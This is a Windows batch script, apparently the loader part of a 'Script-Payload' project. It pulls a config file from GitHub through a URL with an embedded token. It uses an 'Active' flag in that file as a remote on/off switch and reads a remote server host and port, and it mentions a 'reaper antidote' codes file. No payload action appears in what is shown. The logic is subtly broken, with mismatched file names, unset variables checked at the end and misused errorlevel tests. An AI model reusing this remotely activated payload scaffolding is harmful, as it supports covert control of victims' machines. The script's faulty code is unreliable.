@echo on
setlocal enabledelayedexpansion

:: color 0F is default color
:: color 40 is black on red "warning state"
:: Set Console Window Properties 80x25-> mode con: cols=80 lines=25 

:: Set the URL of the configuration file on GitHub
set "configUrl=https://raw.githubusercontent.com/raf181/Script-Payload/main/Project%201/Config/Remote/config.cfg?token=GHSAT0AAAAAACD4CYPDS32BP27TSTTHHZ44ZGS2VNQ"
set "config_local=Local-Config.cfg"
:: Set loacl path for "antidote" codes
set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
:: set available_remote_config and active_status to spected values
set "available_remote_config=true"
set "active_status=false"
:: Loop through each line in the fetched configuration file
for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
    :: Check if the line contains "Active=true"
    echo %%i | findstr /i "Active=true" >nul
    if %errorlevel% equ 0 (
        set "active_status=true"
        :: Action when "Active=true" is found in the configuration file.
    ) else (
        :: Check if the line contains "Active=false"
        echo %%i | findstr /i "Active=false" >nul
        if %errorlevel% equ 0 (
            set "active_status=false"
            :: Action when "Active=false" is found in the configuration file.
            ) else (
            :: Try pinging the remote URL to check availability
            ping %configUrl% -n 1 >nul 2>&1
            if %errorlevel% neq 0 (
                echo Remote file not available.
                set "available_remote_config=false"
            ) else (
                :: Action when remote file is available but no Active status found.
                echo
            )
        )
    )
)
:: Check the different scenarios and perform actions accordingly
if %available_remote_config% equ true (
    if %active_status% equ true (
        echo Remote file available with "Active=true".
        set "config_file=curl -s %configUrl%"
        goto Active
    ) else (
        echo Remote file available with "Active=false".
        pause
        exit /b 0
    )
) else (
    echo Remote file not available.
    :: Check if a local configuration file exists
    if exist "Config.cfg" (
        :: Local configuration file exists
        echo Local configuration file found. Checking if it is active...
        :: Check if the line "Active=true" exists in the local configuration file
        findstr /i "Active=true" "%config_local%" >nul
        if %errorlevel% equ 0 (
            :: The line "Active=true" is found in the local configuration file
            echo Local configuration file is active. Running the script...
            set "config_file=type %config_local%"
            goto Active    
        ) else (
            :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
            echo Local configuration file is not active. Exiting...
            pause
            exit /b 0
        )
    ) else (
        :: Local configuration file does not exist
        echo Local configuration file not found. Exiting...
        pause
        exit /b 0
    )
)





:Active 
:: Read the remote configuration file
for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
    if /i "%%a"=="SERVER_DSERVER_REMOTE" (
        :: Get the target server from the remote configuration
        set "server_dserver_remote=%%b"
    ) else if /i "%%a"=="SERVER_DSERVER_REMOTE_PORT" (
        :: Get the target server port from the remote configuration
        set "server_dserver_remote_port=%%b"
    )
)

:: Validate if all the required variables are set
if not defined target_server (
    echo.
)
if not defined target_port (
    echo.
)
